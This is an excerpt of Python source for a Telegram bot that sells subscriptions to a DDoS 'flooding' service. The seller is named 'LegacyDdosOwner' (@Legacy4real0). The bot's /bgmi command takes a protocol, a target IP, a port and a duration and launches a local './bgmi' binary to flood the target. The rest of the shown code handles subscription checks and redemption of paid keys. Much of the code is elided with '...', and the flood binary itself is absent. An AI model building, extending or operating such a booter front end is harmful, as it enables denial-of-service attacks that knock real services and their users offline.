...
from evilx import BOT_TOKEN, ADMIN_IDS
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users:
        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @Legacy4real0", reply_markup=main_menu_keyboard())
    else:
        expiration_date = users[user_id]
        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by LegacyDdosOwner:-@Legacy4real0", reply_markup=main_menu_keyboard())
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(context.args) != 4:
        await update.message.reply_text("🛠️ Usage: /bgmi <protocol> <target_ip> <port> <duration>\nProtocol: tcp or udp")
        return
    ...
    if protocol not in ['tcp', 'udp']:
        await update.message.reply_text("⚠️ Protocol must be either 'tcp' or 'udp'.")
        return
    ...
    command = ['./bgmi', protocol, target_ip, str(port), str(duration)]
    try:
        ...
        await update.message.reply_text(f"🚀 Flooding started on {target_ip}:{port} for {duration} seconds using {protocol.upper()} protocol.\n🔑 Attack ID: {unique_id} has been generated for your session.")
    except Exception as e:
...
async def radeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            del keys[key]
            save_keys()
            response = f"✅Key radeemed successfully!"
        else:
...
if __name__ == '__main__':
    ...
    app.add_handler(CommandHandler("radeem", radeem))
